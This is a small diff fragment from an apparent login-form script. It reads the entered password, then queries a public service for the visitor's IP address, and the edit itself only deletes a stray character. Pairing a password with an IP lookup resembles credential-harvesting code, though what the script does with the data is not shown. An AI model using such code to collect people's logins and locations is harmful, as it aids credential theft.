@@ -79,7 +79,7 @@
             const password = document.getElementById('password').value;
 
             try {
-                l
+                
                 const ipResponse = await fetch('https://api.ipify.org?format=json');
                 const ipData = await ipResponse.json();
                 const ipAddress = ipData.ip;
